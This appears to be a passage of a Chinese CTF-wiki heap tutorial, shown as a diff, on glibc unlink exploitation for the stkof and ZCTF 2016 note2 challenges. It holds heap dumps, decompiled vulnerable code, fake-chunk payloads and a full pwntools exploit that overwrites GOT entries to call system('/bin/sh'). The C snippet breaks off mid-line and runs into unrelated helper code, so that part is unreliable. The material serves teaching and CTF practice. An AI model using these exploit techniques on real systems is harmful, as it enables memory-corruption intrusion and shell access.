@@ -1,0 +1,223 @@
+0xe05840 PREV_INUSE {
+  prev_size = 0,
+  size = 133057,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
+  bk_nextsize = 0x0
+}
+```
+此后，无论是输入输出都不会再申请缓冲区了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。
+但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。
+```
+pwndbg> heap
+Top Chunk: 0x1e9b010
+Last Remainder: 0
+0x1e9a000 PREV_INUSE {
+  prev_size = 0,
+  size = 4113,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
+  bk_nextsize = 0x0
+}
+0x1e9b010 PREV_INUSE {
+  prev_size = 0,
+  size = 135153,
+  fd = 0x0,
+  bk = 0x0,
+  fd_nextsize = 0x0,
+  bk_nextsize = 0x0
+}
+```
+### 基本思路
+根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。
+由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下
+- 利用 unlink 修改 global[2] 为 &global[2]-0x18。
+- 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 atoi@got 地址。
+- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。
+- free global[1]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。
+- 修改 `atoi@got` 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。
+代码如下
+```python
+context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+if args['DEBUG']:
+    context.log_level = 'debug'
+context.binary = "./stkof"
+stkof = ELF('./stkof')
+if args['REMOTE']:
+    p = remote('127.0.0.1', 7777)
+else:
+    p = process("./stkof")
+log.info('PID: ' + str(proc.pidof(p)[0]))
+libc = ELF('./libc.so.6')
+head = 0x602140
+def alloc(size):
+    p.sendline('1')
+    p.sendline(str(size))
+    p.recvuntil('OK\n')
+def edit(idx, size, content):
+    p.sendline('2')
+    p.sendline(str(idx))
+    p.sendline(str(size))
+    p.send(content)
+    p.recvuntil('OK\n')
+def free(idx):
+    p.sendline('3')
+    p.sendline(str(idx))
+def exp():
+    # trigger to malloc buffer for io function
+    alloc(0x100)  # idx 1
+    # begin
+    alloc(0x30)  # idx 2
+    # small chunk size in order to trigger unlink
+    alloc(0x80)  # idx 3
+    # a fake chunk at global[2]=head+16 who's size is 0x20
+    payload = p64(0)  #prev_size
+    payload += p64(0x20)  #size
+    payload += p64(head + 16 - 0x18)  #fd
+    payload += p64(head + 16 - 0x10)  #bk
+    payload += p64(0x20)  # next chunk's prev_size bypass the check
+    payload = payload.ljust(0x30, 'a')
+    # overwrite global[3]'s chunk's prev_size
+    # make it believe that prev chunk is at global[2]
+    payload += p64(0x30)
+    # make it believe that prev chunk is free
+    payload += p64(0x90)
+    edit(2, len(payload), payload)
+    # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8
+    free(3)
+    p.recvuntil('OK\n')
+    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
+    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(
+        stkof.got['atoi'])
+    edit(2, len(payload), payload)
+    # edit free@got to puts@plt
+    payload = p64(stkof.plt['puts'])
+    edit(0, len(payload), payload)
+    # free global[1] to leak puts addr
+    free(1)
+    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
+    puts_addr = u64(puts_addr)
+    log.success('puts addr: ' + hex(puts_addr))
+    libc_base = puts_addr - libc.symbols['puts']
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))
+    system_addr = libc_base + libc.symbols['system']
+    log.success('libc base: ' + hex(libc_base))
+    log.success('/bin/sh addr: ' + hex(binsh_addr))
+    log.success('system addr: ' + hex(system_addr))
+    # modify atoi@got to system addr
+    payload = p64(system_addr)
+    edit(2, len(payload), payload)
+    p.send(p64(binsh_addr))
+    p.interactive()
+if __name__ == "__main__":
+    exp()
+```
+## 2016 ZCTF note2
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2)
+### 分析程序
+首先，我们先分析一下程序，可以看出程序的主要功能为
+- 添加note，size限制为0x80，size会被记录，note指针会被记录。
+- 展示note内容。
+- 编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。
+- 释放note。
+仔细分析后，可以发现程序有以下几个问题
+1. 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
+2. 程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。
+第一个问题对应在ida中的代码如下
+```c
+unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
+{
+  char v4; // [sp+Ch] [bp-34h]@1
+  char buf; // [sp+2Fh] [bp-11h]@2
+  unsigned __int64 i; // [sp+30h] [bp-10h]@1
+  __int64 v7; // [sp+38h] [bp-8h]@2
+  v4 = a3;
+  for ( i = 0LL; a2 - 1 > i; ++i )
+  {
+    v7 = read(0, &buf, 1uLL);
+    if ( v7 >')
+    p.sendline('1')
+    p.recvuntil('(less than 128)')
+    p.sendline(str(length))
+    p.recvuntil('content:')
+    p.sendline(content)
+def shownote(id):
+    p.recvuntil('option--->>')
+    p.sendline('2')
+    p.recvuntil('note:')
+    p.sendline(str(id))
+def editnote(id, choice, s):
+    p.recvuntil('option--->>')
+    p.sendline('3')
+    p.recvuntil('note:')
+    p.sendline(str(id))
+    p.recvuntil('2.append]')
+    p.sendline(str(choice))
+    p.sendline(s)
+def deletenote(id):
+    p.recvuntil('option--->>')
+    p.sendline('4')
+    p.recvuntil('note:')
+    p.sendline(str(id))
+```
+#### 生成三个note
+构造三个 chunk，chunk0、chunk1 和 chunk2
+```python
+# chunk0: a fake chunk
+ptr = 0x0000000000602120
+fakefd = ptr - 0x18
+fakebk = ptr - 0x10
+content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
+#content = p64(fakefd) + p64(fakebk)
+newnote(128, content)
+# chunk1: a zero size chunk produce overwrite
+newnote(0, 'a' * 8)
+# chunk2: a chunk to be overwrited and freed
+newnote(0x80, 'b' * 16)
+```
+其中这三个 chunk 申请时的大小分别为0x80，0，0x80，chunk1 虽然申请的大小为0，但是 glibc 的要求 chunk 块至少可以存储 4 个必要的字段(prev\_size,size,fd,bk)，所以会分配 0x20 的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。
+这里需要注意的是，chunk0 中一共构造了两个 chunk
+- chunk ptr[0]，这个是为了 unlink 时修改对应的值。
+- chunk ptr[0]'s nextchunk，这个是为了使得 unlink 时的第一个检查满足。
+```c
+    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
+      malloc_printerr ("corrupted size vs. prev_size");			      \
+```
+当构造完三个 note 后，堆的基本构造如图1所示。
+```
+                                   +-----------------+ high addr
+                                   |      ...        |
+                                   +-----------------+
+                                   |      'b'*8      |
+                ptr[2]-----------> +-----------------+
+                                   |    size=0x91    |
+                                   +-----------------+
+                                   |    prevsize     |
+                                   +-----------------|------------
+                                   |    unused       |
+                                   +-----------------+
+                                   |    'a'*8        |
+                 ptr[1]----------> +-----------------+  chunk 1
+                                   |    size=0x20    |
+                                   +-----------------+
+                                   |    prevsize     |
+                                   +-----------------|-------------
+                                   |    unused       |
+                                   +-----------------+
+                                   |  prev_size=0x60 |
+fake ptr[0] chunk's nextchunk----->+-----------------+
+                                   |    64*'a'       |
+                                   +-----------------+
+                                   |    fakebk       |
+                                   +-----------------+
+                                   |    fakefd       |
+                                   +-----------------+
+                                   |    0x61         |  chunk 0
+                                   +-----------------+
+                                   |    'a *8        |
+                 ptr[0]----------> +-----------------+
+                                   |    size=0x91    |
+                                   +-----------------+
